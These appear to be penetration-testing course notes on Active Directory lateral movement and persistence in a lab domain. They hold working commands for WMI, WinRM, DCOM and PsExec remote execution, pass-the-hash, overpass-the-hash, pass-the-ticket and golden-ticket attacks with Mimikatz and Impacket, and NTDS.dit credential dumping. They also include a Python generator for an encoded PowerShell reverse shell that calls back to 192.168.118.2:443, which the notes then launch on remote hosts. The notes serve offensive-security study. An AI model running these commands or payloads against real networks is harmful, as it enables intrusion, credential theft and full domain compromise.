# Active Directory Lateral Movement Techniques

### WMI and WinRM
- [_Windows Management Instrumentation_](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), which is an object-oriented feature that facilitates task automation.

- WMI is capable of creating processes via the _Create_ method from the _Win32_Process_ class. It communicates through [_Remote Procedure Calls_](https://learn.microsoft.com/en-us/windows/win32/rpc/rpc-start-page) (RPC) over port 135 for remote access and uses a higher-range port (19152-65535) for session data.
- To demonstrate this attack technique, we'll first briefly showcase the _wmic_ utility, which has been [recently deprecated](https://docs.microsoft.com/en-us/windows/deployment/planning/windows-10-deprecated-features), and then we'll discover how to conduct the same WMI attack via PowerShell.
- We already encountered [_UAC remote restrictions_](https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction#domain-user-accounts-active-directory-user-account) for non-domain joined machines in the _Password Attacks_ Module. However, this kind of restriction does not apply to domain users, meaning that we can leverage full privileges while moving laterally with the techniques shown in this Learning Unit.
- `wmic /node:192.168.226.72 /user:jen /password:Nexus123! process call create "calc"`
- ```$username = 'jen';
	$password = 'Nexus123!';
	$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
	$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;```
- Now that we have our PSCredential object, we need to create a _Common Information Model_ (CIM) via the [_**New-CimSession**](https://docs.microsoft.com/en-us/powershell/module/cimcmdlets/new-cimsession?view=powershell-7.2) cmdlet.

To do that, we'll first specify DCOM as the protocol for the WMI session with the **New-CimSessionOption** cmdlet on the first line. On the second line, we'll create the new session, **New-Cimsession** against our target IP, using **-ComputerName** and supply the PSCredential object (**-Credential $credential**) along with the session options (**-SessionOption $Options**). Lastly, we'll define 'calc' as the payload to be executed by WMI.

- ```$options = New-CimSessionOption -Protocol DCOM
	$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options 
	$command = 'calc';```
- As a final step, we need to tie together all the arguments we configured previously by issuing the _Invoke-CimMethod_ cmdlet and supplying **Win32_Process** to the _ClassName_ and **Create** to the _MethodName_. To send the argument, we wrap them in **@{CommandLine =$Command}**.
	- ```Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};```
- To simulate the technique, we can connect to CLIENT74 as _jeff_ and insert the above code in a PowerShell prompt. (Not all the code is shown below.)
	- ```$username = 'jen';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};```
- Script:
	- ```
		import sys
		import base64
		
		payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
		
		cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
		
		print(cmd)```
		- `python3 encode.py`
		- ```$username = 'jen';
		$password = 'Nexus123!';
		$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
		$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
		$Options = New-CimSessionOption -Protocol DCOM
		$Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
		$Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
		HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';
		Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};```

s an alternative method to WMI for remote management, WinRM can be employed for remote host management. WinRM is the Microsoft version of the [_WS-Management_](https://en.wikipedia.org/wiki/WS-Management) protocol and it exchanges XML messages over HTTP and HTTPS. It uses TCP port 5986 for encrypted HTTPS traffic and port 5985 for plain HTTP.

In addition to its PowerShell implementation, which we'll cover later in this section, WinRM is implemented in numerous built-in utilities, such as [_winrs_](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/winrs) (Windows Remote Shell).

- **winrs**
	- `winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
	- `winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"`

- Make credential variable and enter new PSSesion
	- ```$username = 'jen';
		$password = 'Nexus123!';
		$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
		$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
		New-PSSession -ComputerName 192.168.226.72 -Credential $credential```
	- `Enter-PSSession 1`

### PsExec

It is possible to misuse this tool for lateral movement, but three requisites must be met. First, the user that authenticates to the target machine needs to be part of the Administrators local group. Second, the _ADMIN$_ share must be available, and third, File and Printer Sharing has to be turned on. Luckily for us, the last two requirements are already met as they are the default settings on modern Windows Server systems.

To execute the command remotely, PsExec performs the following tasks:

- Writes **psexesvc.exe** into the **C:\Windows** directory
- Creates and spawns a service on the remote host
- Runs the requested program/command as a child prpowerocess of **psexesvc.exe**

- ```./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
hostname
whoami```

### Pass the Hash

*Pass the Hash*
- allows an attacker to authenticate to a remote system or service using a user's NTLM hash instead of the user's plaintext password
- attacker connects to the victim using the _Server Message Block_ (SMB) protocol and 
- [Note]:
	- This will only work for servers or services using NTLM authentication

Many third-party tools and frameworks use PtH to allow users to both authenticate and obtain code execution, including:

- [_PsExec_](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/) from Metasploit
- [_Passing-the-hash toolkit_](https://github.com/byt3bl33d3r/pth-toolkit)
- [_Impacket_](https://github.com/CoreSecurity/impacket/blob/master/examples/smbclient.py)

Most tools that are built to abuse PtH can be leveraged to start a Windows service (for example, cmd.exe or an instance of PowerShell) and communicate with it using [_Named Pipes_](https://msdn.microsoft.com/en-us/library/windows/desktop/aa365590(v=vs.85).aspx). This is done using the [Service Control Manager](https://msdn.microsoft.com/en-us/library/windows/desktop/ms685150(v=vs.85).aspx) API.
	- Unless we want to gain remote code execution, PtH does not need to create a Windows service for any other usage, such as accessing an SMB share.

3 Requirements:
1.  Requires an SMB connection through the firewall (commonly port 445)
2. The Windows File and Printer Sharing feature to be enabled
3. **ADMIN$** share to be available.
	- To establish a connection to this share, the attacker must present valid credentials with local administrative permissions.
- This type of lateral movement typically requires local administrative rights

Example (w/ *wmiexec* from **Impacket suite**)
	- To demonstrate this, we can use _wmiexec_ from the [Impacket suite](https://github.com/fortra/impacket/tree/master) from our local Kali machine against the local administrator account on FILES04. We are going to invoke the command by passing the local Administrator hash that we gathered in a previous Module and then specifying the username along with the target IP.
- ```/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.198.72```
- `hostname`
- `whoami`

- [Note]:
	- This method works for Active Directory domain accounts and the built-in local administrator account. However, due to the [2014 security update](https://support.microsoft.com/en-us/help/2871997/microsoft-security-advisory-update-to-improve-credentials-protection-a), this technique can not be used to authenticate as any other local admin account.

### Overpass the Hash

With [_overpass the hash_](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf), we can "over" abuse an NTLM user hash to gain a full Kerberos [_Ticket Granting Ticket_](https://learn.microsoft.com/en-us/windows/win32/secauthn/ticket-granting-tickets) (TGT). Then we can use the TGT to obtain a [_Ticket Granting Service_](https://learn.microsoft.com/en-us/windows/win32/secauthn/ticket-granting-service-exchange) (TGS).

- Example:
	- To demonstrate this, let's assume we have compromised a workstation (or server) that _jen_ has authenticated to. We'll also assume that the machine is now caching their credentials (and therefore, their NTLM password hash).
	- Set up:
		-  Log in to the Windows 10 CLIENT76 machine as _jeff_ and run a process as _jen_, which prompts authentication.
			- Simply:
				- Right-click the Notepad icon on the desktop then shift left-click "show more options" on the popup -> run as different user
	- Start:
		- Validate cached creds with **mimikatz**
			- `privilege::debug`
			- `sekurlsa::logonpasswords`
			- output -> jen's pw hash
		
	- The essence of the overpass the hash lateral movement technique is to turn the NTLM hash into a Kerberos ticket and avoid the use of NTLM authentication.

	- Create a new PowerShell process in the context of _jen_ --> This new prompt will allow us to obtain Kerberos tickets without performing NTLM authentication over the network, with **sekurlsa::pth**
		- `sekurlsa::pth /user:maria /domain:corp.com /ntlm:2a944a58d4ffa77137b2c587e6ed7626 /run:powershell`
			- **sekurlsa::pth** = module
			- **/run** = specify the process to create (in this case, PowerShell).
	- At this point, we have a new PowerShell session that allows us to execute commands as _jen_.
		- [Note]:
			- `At this point, running the _whoami_ command on the newly created PowerShell session would show _jeff_'s identity instead of _jen_.`
			- `this is the intended behavior of the _whoami_ utility which only checks the current process's token and does not inspect any imported Kerberos tickets`
	- Check cached Kerberos tickets
		- `klist`
		- output -> no tickets
	- No Kerberos tickets have been cached, but this is expected since _jen_ has not yet performed an interactive login. Let's generate a TGT by authenticating to a network share on the files04 server with **net use**.
		- `net use \\files04`
	- Check cached Kerberos tickets
		- `klist`
		- output -> Kerberos tickets, including the TGT and a TGS for the _Common Internet File System_ (CIFS) service.
			- ticket #0 = TGT (because the server is **krbtgt**)
		- [Note]:
			- `We used net use arbitrarily in this example, but we could have used any command that requires domain permissions and would subsequently create a TGS.`
	- We have now converted our NTLM hash into a Kerberos TGT, allowing us to use any tools that rely on Kerberos authentication (as opposed to NTLM).

	- We will use *PsExec*
		- PsExec can run a command remotely but does not accept password hashes
	- Since we have generated Kerberos tickets and operate in the context of _jen_ in the PowerShell session, we can reuse the TGT to obtain code execution on the files04 host.
		- `cd C:\tools\SysinternalsSuite\`
		- `.\PsExec.exe \\files04 cmd`
		- `whoami`
		- `hostname`
	- As evidenced by the output, we have successfully reused the Kerberos TGT to launch a command shell on the files04 server.

#### Pass the Ticket

*Pass the Ticket attack*
	- Takes advantage of the TGS, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service.
	- In addition, if the service tickets belong to the current user, then no administrative privileges are required.

Scenario:
	- In this scenario, we are going to abuse an already existing session of the user dave. The dave user has privileged access to the backup folder located on WEB04 whereas our logged-in user jen does not.

Example:
	- To demonstrate the attack angle, we are going to extract all the current TGT/TGS in memory and inject dave's WEB04 TGS into our own session. This will allow us to access the restricted folder.
	- Setup:
		- Let's first log in as jen to CLIENT76 and verify that we are unable to access the resource on WEB04. To do so, we'll try to list the content of the \\web04\backup folder from an administrative PowerShell command line session.
			- `whomai`
			- `ls \\web04\backup`
			- output -> access denied
	- Confirming that jen has no access to the restricted folder, we can now launch **mimikatz**, enable debug privileges, and export all the TGT/TGS from memory with the **sekurlsa::tickets /export** command
		- `privilege::debug`
		- `sekurlsa::tickets /export`
			- The above command parsed the *LSASS* process space in memory for any TGT/TGS, which is then saved to disk in the *kirbi* **mimikatz** format.
	- Inspecting the generated tickets indicates that dave had initiated a session. We can try to inject one of their tickets inside jen's sessions.
	- Verify newly generated tickets
		-`dir *.kirbi`
	- As many tickets have been generated, we can just pick any TGS ticket in the **dave@cifs-web04.kirbi** format and inject it through mimikatz via the **kerberos::ptt command**
		- `kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi`
	- Verify ticket
		- `klist`
	- Confirm successful
		- `ls \\web04\backup`

### DCOM

DCOM (*Distributed Component Object Model*)
- COM
	- System for creating software components that interact with each other
	- COM was created for either same-process or cross-process interaction
	- Extended to DCOM for interaction between multiple computers over a network
- Interaction with DCOM is performed over RPC on TCP port 135
	- [Local administrator] access is required to call the DCOM Service Control Manager
		- (API)
- DCOM lateral movement techniques
	- Cybereason
		- https://www.cybereason.com/blog/dcom-lateral-movement-techniques

Example:
- *Microsoft Management Console* (MMC) COM application
	- Employed for scripted automation of Windows systems.
- MMC Application Class allows the creation of *Application Objects*
	- Exposes the ExecuteShellCommand method under the Document.ActiveView property
		- [Allows the execution of any shell command as long as the authenticated user is authorized (i.e. local admin)]
- Set up:
	-  jen user logged in from the already compromised Windows 11 CLIENT74 host.
	
- Start:
	- From an elevated PowerShell prompt, we can instantiate a remote MMC 2.0 application by specifying the target IP of FILES04 as the second argument of the GetTypeFromProgID method.
		- `$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.218.72"))`
	- Once the application object is saved into the *$dcom* variable, we can pass the required argument to the application via the **ExecuteShellCommand** method. The method accepts four parameters: **Command**, **Directory**, **Parameters**, and **WindowState**. We're only interested in the first and third parameters, which will be populated with **cmd** and **/c calc**.
		- `$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")`
	- Once we execute these two PowerShell lines from CLIENT74, we should have spawned an instance of the calculator app.
	- Because it's within Session 0, we can verify the calculator app is running with **tasklist** and filtering out the output with **findstr**.
		- `tasklist | findstr "calc"`
	- Start listener on Kali
		- `nv -lvnp 443`
	- Replace our DCOM payload with the base64 encoded reverse shell with from Python script from *WMI and WinRM* section.
		- ```$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")```
	- verify on kali
		- `whoami`
		- `hostname`

# Active Directory Persistence
		- [Note]: in many real-world penetration tests or red-team engagements, persistence is not part of the scope due to the risk of incomplete removal once the assessment is complete.

### Golden Ticket

- We'll recall that when a user submits a request for a TGT, the KDC encrypts the TGT with a secret key known only to the KDCs in the domain.
	- This secret key is the password hash of a domain user account called **krbtgt**.
- If we can get our hands on the *krbtgt* password hash, we could create our own self-made custom TGTs, also known as golden tickets.
- Silver Ticket vs Golden Ticket
	- While Silver Tickets aim to forge a TGS ticket to access a specific service, Golden Tickets give us permission to access the entire domain's resources.
- Example:
	- We could create a TGT stating that a non-privileged user is a member of the Domain Admins group, and the domain controller will trust it because it is correctly encrypted.
- [Note]:
	- We must carefully protect stolen krbtgt password hashes because they grant unlimited domain access. Consider explicitly obtaining the client's permission before executing this technique.
-  *krbtgt* account password is not automatically changed.
	- This password is only changed when the domain functional level is upgraded from a pre-2008 Windows server, but not from a newer version. Because of this, it is not uncommon to find very old krbtgt password hashes.
		- **Domain Functional Level**
			- `dictates the capabilities of the domain and determines which Windows operating systems can be run on the domain controller. Higher functional levels enable additional features, functionality, and security mitigations.`
Example:
- Scenario:
	- we will first attempt to laterally move from the Windows 11 CLIENT74 workstation to the domain controller via PsExec as the jen user by spawning a traditional command shell with the cmd command.
		- result -> fail 
			- We do not have the proper permissions.
	- `PsExec64.exe \\DC1 cmd.exe`
	- output -> Access is denied
- Scenario (continued):
	- With this kind of access, we can extract the password hash of the krbtgt account with Mimikatz.
- Setup:
	- To simulate this, we'll log in to the domain controller with remote desktop using the jeffadmin account.
- Start:
	- Run Mimikatz from **C:\Tools**, and issue the **lsadump::lsa command**
		- `privilege::debug`
		- `lsadump::lsa /patch`
		- RESULT -> NTLM hash of krbtgt account & domain SID
			- Can forge and inject Golden Ticket
	- [Note]: Creating the golden ticket and injecting it into memory does not require any administrative privileges and can even be performed from a computer that is not joined to the domain.
	- Let's move back to CLIENT74 as the jen user. Before we generate the golden ticket let's launch mimikatz and delete any existing Kerberos tickets with **kerberos::purge**.
		- `kerberos::purge`
	- Now, we'll supply the domain SID (which we can gather with **whoami /user**) to the Mimikatz **kerberos::golden** command to create the golden ticket.
	- This time, we'll use the **/krbtgt** option instead of **/rc4** to indicate we are supplying the password hash of the krbtgt user account. Starting July 2022, Microsoft improved the authentication process, so we'll need to provide an existing account. Let's set the golden ticket's username to **jen**. Before it didn't matter if the account existed.
		- `kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt`
		- `misc::cmd`
			- Mimikatz provides two sets of default values when using the golden ticket option: the user ID and the groups ID. The user ID is set to 500 by default, which is the RID of the built-in administrator for the domain. The values for the groups ID consist of the most privileged groups in Active Directory, including the Domain Admins group.
	- With the golden ticket injected into memory, let's use *PsExec* to launch a new command prompt with **misc::cmd**.
		- `PsExec.exe \\dc1 cmd.exe`
		- `ipconfig`
	- Use the **whoami** command to verify that our user jen is now part of the Domain Admin group.
		- `whoami /groups`

- [Note]: that by creating our own TGT and then using PsExec, we are performing the **overpass the hash** attack by leveraging Kerberos authentication as we discussed earlier in this Module.
	- If we were to connect PsExec to the IP address of the domain controller instead of the hostname, we would instead force the use of NTLM authentication and access would still be blocked. This is illustrated in the listing below.
		- `psexec.exe \\192.168.50.70 cmd.exe`
		- result -> Access denied

### Shadow Copies

Shadow Copy (*Volume Shadow Service* (VSS))
	- Microsoft backup technology that allows the creation of snapshots of files or entire volumes.
	- *vshadow.exe*
		- Microsoft signed binary to manage volume shadow copies
		- Offered as part of the Windows SDK

Concept:
- As domain admins, we can abuse the vshadow utility to create a Shadow Copy that will allow us to extract the Active Directory Database **NTDS.dit** database file.
- Once we've obtained a copy of the database, we need the **SYSTEM hive**, and then we can extract every user credential offline on our local Kali machine.

Example:
- Set-up:
	- connect as the jeffadmin domain admin user to the DC1 domain controller
- Start:
	- Launch an elevated command prompt and run the **vshadow** utility
		- `vshadow.exe -nw -p C:`
			- **-nw** = disable writers (speeds up backup creation)
			- **-p** = store the copy on disk `C:`
	- Once the snapshot has been taken successfully, we should take note of the shadow copy device name.
	- We'll now copy the whole AD Database from the shadow copy to the **C:** drive root folder by specifying the *shadow copy device name* and adding the full **ntds.dit** path.
		- `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak`
	- As a last ingredient, to correctly extract the content of **ntds.dit**, we need to save the SYSTEM hive from the Windows registry. We can accomplish this with the **reg** utility and the **save** argument.
		- `reg.exe save hklm\system c:\system.bak`
	- Once the two **.bak** files are moved to our Kali machine, we can continue extracting the credential materials with the *secretsdump* tool from the impacket suite. We'll supply the ntds database with the **-ntds** parameter and the system hive with the **-system** parameter. Then we will tell impact to parse the files locally by adding the **LOCAL** keyword.
		- `impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL`
- More Sneaky Alternative:
	- While these methods might work fine, they leave an access trail and may require us to upload tools. An alternative is to abuse AD functionality itself to capture hashes remotely from a workstation.
	- To do this, we could move laterally to the domain controller and run Mimikatz to dump the password hash of every user, using the DC sync method described in the previous Module. This is a less conspicuous persistence technique that we can misuse.
	- [Note]:
		- `Although most penetration tests wouldn't require us to be covert, we should always evaluate a given technique's stealthiness, which could be useful during future red-teaming engagements`
		- `The concept of stealth is a requirement on red-teaming exercises but generally not on penetration testing ones.`
			